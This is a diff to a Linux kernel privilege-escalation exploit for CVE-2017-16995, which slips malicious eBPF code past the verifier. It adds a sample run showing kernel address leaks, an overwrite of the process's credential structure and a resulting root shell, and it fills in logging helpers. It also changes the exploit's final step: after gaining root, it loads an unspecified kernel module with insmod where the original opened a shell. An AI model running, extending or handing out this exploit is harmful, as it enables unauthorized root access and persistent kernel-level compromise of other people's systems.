@@ -14,6 +14,26 @@
   4.10.0.42-generic
   4.13.0-21-generic
 
+  Tested on Fedora 27
+  4.13.9-300
+  gcc cve-2017-16995.c -o cve-2017-16995
+  internet@client:~/cve-2017-16995$ ./cve-2017-16995
+  [.]
+  [.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+  [.]
+  [.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+  [.]
+  [*] creating bpf map
+  [*] sneaking evil bpf past the verifier
+  [*] creating socketpair()
+  [*] attaching bpf backdoor to socket
+  [*] skbuff => ffff880038c3f500  
+  [*] Leaking sock struct from ffff88003af5e180
+  [*] Sock->sk_rcvtimeo at offset 472
+  [*] Cred structure at ffff880038704600
+  [*] UID from cred structure: 1000, matches the current: 1000
+  [*] hammering cred structure at ffff880038704600
+  [*] credentials patched, launching shell...
   #id
   uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(internet)
   
@@ -277,18 +297,43 @@ static int load_prog()
 
 void info(const char *fmt, ...)
 {
+	va_list args;
+	va_start(args, fmt);
+	fprintf(stdout, "[.] ");
+	vfprintf(stdout, fmt, args);
+	va_end(args);
 }
 
 void msg(const char *fmt, ...)
 {
+	va_list args;
+	va_start(args, fmt);
+	fprintf(stdout, "[*] ");
+	vfprintf(stdout, fmt, args);
+	va_end(args);
 }
 
 void redact(const char *fmt, ...)
 {
+	va_list args;
+	va_start(args, fmt);
+	if (doredact)
+	{
+		fprintf(stdout, "[!] ( ( R E D A C T E D ) )\n");
+		return;
+	}
+	fprintf(stdout, "[*] ");
+	vfprintf(stdout, fmt, args);
+	va_end(args);
 }
 
 void fail(const char *fmt, ...)
 {
+	va_list args;
+	va_start(args, fmt);
+	fprintf(stdout, "[!] ");
+	vfprintf(stdout, fmt, args);
+	va_end(args);
 	exit(1);
 }
 
@@ -478,9 +523,14 @@ int main(int argc, char **argv)
 {
 	initialize();
 	hammer_cred(find_cred());
-	msg("credentials patched, launching shell...\n");
-	if (execl("/bin/sh", "/bin/sh", NULL))
-	{
-		fail("exec %s\n", strerror(errno));
-	}
+
+	msg("credentials patched, deploying kernel module...\n");
+
+	system("insmod lkm.ko");
+	msg("that's all folks!\n");
+
+	// if (execl("/bin/sh", "/bin/sh", NULL))
+	// {
+	// 	fail("exec %s\n", strerror(errno));
+	// }
 }
